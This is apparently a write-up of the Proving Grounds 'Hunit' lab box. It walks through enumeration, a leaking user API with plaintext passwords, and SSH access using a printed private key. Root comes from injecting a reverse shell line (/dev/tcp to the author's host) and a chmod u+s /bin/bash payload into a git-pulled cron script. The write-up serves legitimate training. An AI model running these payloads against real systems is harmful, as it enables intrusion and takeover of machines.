# CTF Writeup: Hunit

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.130.125
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-26 18:41 EST
Nmap scan report for 192.168.130.125
Host is up (0.040s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
8080/tcp  open  http        Apache Tomcat (language: en)
|_http-title: My Haikus
|_http-open-proxy: Proxy might be redirecting requests
12445/tcp open  netbios-ssn Samba smbd 4
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
|_http-title: Whack A Mole!
|_http-server-header: Apache/2.4.46 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   46.70 ms 192.168.45.1
2   46.68 ms 192.168.45.254
3   47.03 ms 192.168.251.1
4   47.13 ms 192.168.130.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.67 seconds
```

We started off by trying to enumerate the running samba service, but oddly enough it always prompted "timed out".

Let's move on by analyzing the webpages.

The webpage running on port 8080, seems to be an "small" webpage which states some "Haikus" which are short form poems.

We can identify multiple usernames, let's create an wordlist out of those users.

```
james
julie
jennifer
richard
```

Enumerating endpoints lead to finding out abt an /api directory.

```
dirsearch -u http://192.168.130.125:8080    
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                       
                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Hunit/reports/http_192.168.130.125_8080/_25-12-26_18-56-56.txt

Target: http://192.168.130.125:8080/

[18:56:56] Starting:                                                                                                                          
[18:57:00] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[18:57:01] 400 -  435B  - /a%5c.aspx                                        
[18:57:08] 200 -  148B  - /api/                                             
[18:57:09] 404 -  141B  - /article/admin                                    
[18:57:14] 500 -  105B  - /error                                            
[18:57:14] 500 -  105B  - /error/                                           
                                                                             
Task Completed
```

When trying to display the /api endpoint, we receive an 404 error, but not from the server response, just from the webpage itself, because the dev probably whitelabeled this endpoint. 

Enumerated further.

```
dirsearch -u http://192.168.130.125:8080/api/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Hunit/reports/http_192.168.130.125_8080/_api__25-12-26_19-01-40.txt

Target: http://192.168.130.125:8080/

[19:01:40] Starting: api/
[19:01:45] 400 -  435B  - /api/\..\..\..\..\..\..\..\..\..\etc\passwd       
[19:01:45] 400 -  435B  - /api/a%5c.aspx                                    
[19:01:51] 404 -  145B  - /api/article/admin                                
[19:01:51] 200 -    2KB - /api/article/                                     
[19:02:15] 404 -  144B  - /api/user/login.html                              
[19:02:15] 404 -  143B  - /api/user/login.php                               
[19:02:15] 404 -  143B  - /api/user/admin.php
[19:02:15] 404 -  142B  - /api/user/login.js
[19:02:15] 200 -  609B  - /api/user/
[19:02:15] 404 -  139B  - /api/user/admin
[19:02:15] 404 -  140B  - /api/user/signup
[19:02:15] 404 -  135B  - /api/user/2
[19:02:15] 404 -  135B  - /api/user/1                                       
[19:02:15] 404 -  143B  - /api/user/login.jsp
[19:02:15] 404 -  144B  - /api/user/login.aspx
[19:02:15] 404 -  135B  - /api/user/0
[19:02:15] 404 -  140B  - /api/user/login/                                  
[19:02:15] 404 -  135B  - /api/user/3
                                                                             
Task Completed
```

Retrieved /api/user & /api/article.

Very interesting but both whitelabelled, let's move onto the other webpage.

## Initial Access

Let's try and send an request to the /api/user endpoint. It revealed plaintext credentials of all users, which is an severe misconfiguration. 

```
 curl -X GET http://192.168.130.125:8080/api/user/ | jq   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   609    0   609    0     0   9548      0 --:--:-- --:--:-- --:--:--  9666
[
  {
    "login": "rjackson",
    "password": "yYJcgYqszv4aGQ",
    "firstname": "Richard",
    "lastname": "Jackson",
    "description": "Editor",
    "id": 1
  },
  {
    "login": "jsanchez",
    "password": "d52cQ1BzyNQycg",
    "firstname": "Jennifer",
    "lastname": "Sanchez",
    "description": "Editor",
    "id": 3
  },
  {
    "login": "dademola",
    "password": "ExplainSlowQuest110",
    "firstname": "Derik",
    "lastname": "Ademola",
    "description": "Admin",
    "id": 6
  },
  {
    "login": "jwinters",
    "password": "KTuGcSW6Zxwd0Q",
    "firstname": "Julie",
    "lastname": "Winters",
    "description": "Editor",
    "id": 7
  },
  {
    "login": "jvargas",
    "password": "OuQ96hcgiM5o9w",
    "firstname": "James",
    "lastname": "Vargas",
    "description": "Editor",
    "id": 10
  }
]
```

Analyzing all of the users, we can see that the user "dademola" seems to be described as "admin".

Let's try and leverage those credentials by logging into ssh. dademola:ExplainSlowQuest110

```
ssh dademola@192.168.130.125 -p 43022
The authenticity of host '[192.168.130.125]:43022 ([192.168.130.125]:43022)' can't be established.
ED25519 key fingerprint is: SHA256:rNaauuAfZyAq+Dhu+VTKM8BGGiU6QTQDleMX0uANTV4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.130.125]:43022' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dademola@192.168.130.125's password: 
[dademola@hunit ~]$
```

Retrieved local.txt in /home/dademola directory.

```
312614605f5cda263277c32c51c66eda
```

## Privilege Escalation

When observing all of the directories in the root, we can see an git-server directory owned by user "git".

Taking a closer look at the /etc/passwd file, we can tell that there is an "git" user existing on the target system.

```
[dademola@hunit .ssh]$ cat /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-journal-remote:x:982:982:systemd Journal Remote:/:/usr/bin/nologin
systemd-network:x:981:981:systemd Network Management:/:/usr/bin/nologin
systemd-resolve:x:980:980:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:979:979:systemd Time Synchronization:/:/usr/bin/nologin
systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
dhcpcd:x:977:977:dhcpcd privilege separation:/:/usr/bin/nologin
dademola:x:1001:1001::/home/dademola:/bin/bash
git:x:1005:1005::/home/git:/usr/bin/git-shell
avahi:x:976:976:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin
```

When navigating to /home/git we find the .ssh directory, in which the private key of the user is stored!

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtvi+/zIFPzCfn2CBFxGtflgPf6jLxY9ZFEwZNHbQjg32p3cWbzQG
wRWNSVlBYzj6sXPjcWTRc7p08WHb9/85L0/f94lfXUIB9ptipL9EHxSUDxGroP60H9jJTj
0Kuety1G+xSyti++Qji6hxmuRrQ4e5Q6lBn84/CXAnRH6GLYFRywJEXQtLHCwtlhVEqP7H
ZAWLtDFnWQV7eMF9RCNBVSWBbeQITbZDSbctg5P0H35ioPu67Pygo9SfSRXpBPVBI13feB
II2V3iL+BQy6seCj7tHj9pNYZFWjroKVCBZkoLfLsTHRkXDKLRICvcHw1yOWUf4sFNnXkc
lHCxsEU6dJD9k7hwnK1Es+QglXQSS0JOmPwTfpRkrX1d27K31roQP/YGVbZJEi3stAmaZ3
iQ1cQMy2NQ6ESoupNdQeVFy0E4cpp/NDyazh/vt2irc6fUN+jdFvCWZbIO6pml+HWOU3U3
AxFTSXmbrjMHahArxMq/JtUwJauyw09FKtycEO3zAAAFgJYa8VCWGvFQAAAAB3NzaC1yc2
EAAAGBALb4vv8yBT8wn59ggRcRrX5YD3+oy8WPWRRMGTR20I4N9qd3Fm80BsEVjUlZQWM4
+rFz43Fk0XO6dPFh2/f/OS9P3/eJX11CAfabYqS/RB8UlA8Rq6D+tB/YyU49CrnrctRvsU
srYvvkI4uocZrka0OHuUOpQZ/OPwlwJ0R+hi2BUcsCRF0LSxwsLZYVRKj+x2QFi7QxZ1kF
e3jBfUQjQVUlgW3kCE22Q0m3LYOT9B9+YqD7uuz8oKPUn0kV6QT1QSNd33gSCNld4i/gUM
urHgo+7R4/aTWGRVo66ClQgWZKC3y7Ex0ZFwyi0SAr3B8NcjllH+LBTZ15HJRwsbBFOnSQ
/ZO4cJytRLPkIJV0EktCTpj8E36UZK19Xduyt9a6ED/2BlW2SRIt7LQJmmd4kNXEDMtjUO
hEqLqTXUHlRctBOHKafzQ8ms4f77doq3On1Dfo3RbwlmWyDuqZpfh1jlN1NwMRU0l5m64z
B2oQK8TKvybVMCWrssNPRSrcnBDt8wAAAAMBAAEAAAGAL2RonFMJdt+SSMbHSQFkLbiDcy
52cVp62T4IvUUVKeZGAARhhDY2laaObPQ4concrT/2JnXVpqMiDS+quSabWjzXJxem4tHp
DkYbG88Kxv4eh3StPssaPrF5GtHGyHdKy+mOQ4keX14tMsxTeKo3ektaWkMp40mZnEk3co
9PE9ROKkYRDQSS1N5AhIJHwXoUjTy+fdLaEP3RiGqdlpuHHZXUW3FYEUDnVt2iZVVaQxoK
U+Y/+YhJ14WIKHcLXyRi5YG5YGwsVQl3M0Ji+spIs5p6Xr2+Jwak9Zd6laBJt4Dt2/tt9C
eF0ohAr89b4Kkg2tLQ8yphogyP/yZJiOElOcjf3e2CRWrjEVwXmt98EXHUlkf0cj7gcZBa
Ao5Pp/gxGX3wgVSguE1oTTcDa1Cnxu2fpLF1BscVQ3IuugnzMBljKkS0sGHGny1ujSNGE9
L3/jbS0DQBQHwz37S6M2C3W2A4tqmbUcX4xdUHG8kXn1LvybJpbGsTT7eZ3l/NDgBRAAAA
wQCMOvhEi8kvk4uNYJhHSCDdDZ4Hpso0/wQXbJu1SX2ZKkSc0DGJ4MiK5QftbG5g/OQs7g
lV9oteMuOly+WpFWbQYiAhKac7WcFdzJrR3qPALF8Ki5qyZnthibVZ5H98ndbdPCYLu+Le
jJ9w0usWvK2QF/CjGAALuL4ryAPNGCXRx1a2N6AKvfnm/8xb+4cY/3HMpJCGOqwcvQEk+t
PW3F9DqQgp02tkchiljjGI7NEJiYjwfR4spIPK6/DUy4HzkPAAAADBAOYN7bVwgbxc73Xr
NA9r4aSyqvVAQncSXy3sfUimnVKnoNprNlD0GI65YBO3WOQ1tq3MBDloAX9ZD1LDBRp7NL
ZfExqUxBBtTqOdvo8BLNPOvHGdTEGycu74+yPb+CnjqymkrcA7J81rcNM2CjnL9MBFM9R+
DkWUnDMsGg/3JDpNBKhT1kxEHr5UXcX7Ho8bkf0+qUBNagx0j9GuYg74NqaQ1LlBTMR4Ty
jn4T932jkf8EGo/oPhuN86FsOv3hlEeQAAAMEAy5t06uOSOY4aTZd0o8v249k7dfvGWYTG
ZNLEBRIzd1r47LPCkBHXckDNcvHmmSjBSrl9iZkrHSwSFjnL5+UbOCdN3CfRe3o2NuUcaW
yQL0KeFMhCR9tQOFRYDqfEqahd2mKg/7HIYdlaSJBaSf7I4X17SqOKoO/H15E3GMPPdupZ
tX8QOYlpuVHmka5pFsgxgGb0tX36BBIp0M7Dew19niY2DrhsiWte1PwM1Udbibp5xLr6nn
qMb6iia+pJ6DLLAAAACnJvb3RAaHVuaXQ=
-----END OPENSSH PRIVATE KEY-----
```

Analyzing the authorized_keys file also hints that the git user is somehow connected to the "root" user.

```
[dademola@hunit .ssh]$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit
```

When accessing the git user via ssh, we get access, but with an git-shell that seemed to be heavily restricted, when navigating into the "git-shell-commands" directory in /home/git/git-shell-commands" we find nothing inside, which means there is not a single command we can utilize within the shell.

```
ssh -i id_rsa git@192.168.130.125 -p 43022 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
git>
```

After trying to view running cronjobs on /etc/crontab, we get the information that the crontab file isn't on the system, which is rather odd.
Further investigation leads to us finding an custom /etc/crontab.bak file

```
[dademola@hunit ~]$ cat /etc/crontab.bak
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

Judging from the names of the files, there is 2 cronjobs running one is running an backups.sh script every 3 minutes and the other one is probably pulling the remote repository to the target server every 2 minute
with root rights. This means that if we somehow find a way to inject an reverse shell script into the remote git repository we can leverage an root shell.

Note: We have the private key of the git user, which should allow us to push changes into the remote repository, the issue is that the git-shell has no commands available, how can we change that?
or is there any other way to modify or download the git repository to our local machine?

Let's try and run linpeas.sh and pspy64s in order to gain more information about the cronjobs.

Note: Put your local python webserver on port 43022, firewall seems to be blocking port 80.

Downloaded both scripts onto the server and ran them.

```
[dademola@hunit tmp]$ wget http://192.168.45.214:43022/linpeas.sh
--2025-12-27 02:00:43--  http://192.168.45.214:43022/linpeas.sh
Connecting to 192.168.45.214:43022... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971820 (949K) [application/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                          100%[=================================================================>] 949.04K  2.00MB/s    in 0.5s    

2025-12-27 02:00:44 (2.00 MB/s) - 'linpeas.sh' saved [971820/971820]
```

linpeas results were rather unsatisfying, it didn't provide any information which we didn't know.

pspy32 was very promising, it provided us information about the cronjobs which were running.

```
2025/12/27 02:04:49 CMD: UID=0     PID=1      | /sbin/init 
2025/12/27 02:06:01 CMD: UID=0     PID=16952  | /usr/bin/crond -n 
2025/12/27 02:06:01 CMD: UID=0     PID=16951  | /usr/bin/crond -n 
2025/12/27 02:06:01 CMD: UID=0     PID=16955  | /usr/bin/CROND -n 
2025/12/27 02:06:01 CMD: UID=0     PID=16956  | /bin/sh -c /root/git-server/backups.sh 
2025/12/27 02:06:01 CMD: UID=0     PID=16957  | git pull 
2025/12/27 02:06:01 CMD: UID=0     PID=16958  | /usr/lib/git-core/git fetch --update-head-ok 
2025/12/27 02:06:01 CMD: UID=0     PID=16959  | /bin/sh -c git-upload-pack '/git-server' git-upload-pack '/git-server' 
2025/12/27 02:06:01 CMD: UID=0     PID=16960  | /usr/lib/git-core/git rev-list --objects --stdin --not --all --quiet --alternate-refs 
2025/12/27 02:06:01 CMD: UID=0     PID=16961  | /usr/lib/git-core/git rev-list --objects --stdin --not --all --quiet --alternate-refs 
2025/12/27 02:06:01 CMD: UID=0     PID=16962  | /usr/lib/git-core/git maintenance run --auto --no-quiet 
2025/12/27 02:06:01 CMD: UID=0     PID=16963  | /usr/lib/git-core/git merge FETCH_HEAD
```

Downloaded the repo locally.

```
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.130.125:/git-server
Cloning into 'git-server'...
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

Navigating into the git-server repository on my local machine was rather odd, because the backups.sh owned by root was also inside there, upon displaying the contents we were able to retrieve that it's just an mere placeholder file.

```
cat backups.sh           
#!/bin/bash
#
#
# # Placeholder
#
```

Let's modify the .sh script and add an reverse shell script inside.

```
echo "sh -i >& /dev/tcp/192.168.45.214/8080 0>&1" >> backups.sh
```

We should now be able to push the changes made into the remote repository, by using the private key authentication of user "git".

We first need to authenticate our local user to the repository.

```
git config --global user.name "hacker"
git config --global user.email "hacker@hacker.(none)"
```

Utilized the following commands in order to push changes to the remote repository.

```
git add.
git commit -m "pwned."
GIT_SSH_COMMAND='ssh -i /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Hunit/id_rsa -p 43022' git push origin master
```

Let's start up our listener on port 8080.

```
nc -lvnp 8080
```

Since the cronjob is pulling the repository on port 8080 every 2 minutes and will automatically execute the backups.sh every 3mins, we should gain root RCE after some time.

This didn't work for some reason, so I decided to do another priv esc method.

Instead of getting an RCE via reverse shell script, let's modify the bash binary so everyone can access it with sudo rights.

```
echo "chmod u+s /bin/bash" >> backups.sh
```


After some time the /bin/bash binary didn't change. I'm assuming the shebang statement in the script doesn't has any use, because another bash binary is in place I'm assuming the /usr/bin/bash binary is in place. 

The modified backups.sh script should look like this:

```
#!/usr/bin/bash
#
#
# # Placeholder
#
chmod u+s /bin/bash
```

And also gave the script executable permissions.

```
chmod 777 backups.sh
```

After the cronjob got executed, it executed our malicious script and the /bin/bash binary has now SUID set.
With the following command we gained shell as root.

```
/bin/bash -p
```

Retrieved proof.txt in /root directory.

```
e50e136926c505a9b65294b86692350c
``` 
